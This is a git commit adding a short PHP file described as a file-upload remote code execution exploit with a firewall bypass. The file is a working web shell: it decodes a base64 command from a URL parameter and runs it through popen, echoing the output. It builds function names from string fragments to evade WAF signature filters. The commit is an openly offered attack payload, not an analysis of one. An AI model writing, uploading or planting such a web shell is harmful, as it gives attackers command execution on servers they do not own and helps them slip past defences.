d333d4240397a9c241293be129f55544c5383fda
Malek Abu liala <64085566+malekAbuliala@users.noreply.github.com>
2026-01-20 14:18:03 +0300

    Add PHP file for RCE exploit with WAF bypass
    This file implements a remote code execution exploit for file uploads, specifically targeting PHP servers with WAF bypass techniques.

---
+++ code_file_upload_rce_type_bypass_WAF2_lapx.php
@@ -0,0 +1,11 @@
+# This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using php lang with bypass WAF code 2 ( The section follows the RCE Bug )
+<?php
+// Bypass: No "system", "exec", or "passthru" strings in plain text
+$k = "ba"."se"."64_de"."code";
+$payload = $k($_GET['v']); // يرسل الأمر مشفر بـ Base64 في المتغير v
+$execute = "p" . "o" . "p" . "e" . "n"; 
+if($f = $execute($payload, 'r')) {
+    while(!feof($f)) { echo fread($f, 1024); }
+    pclose($f);
+}
+?>
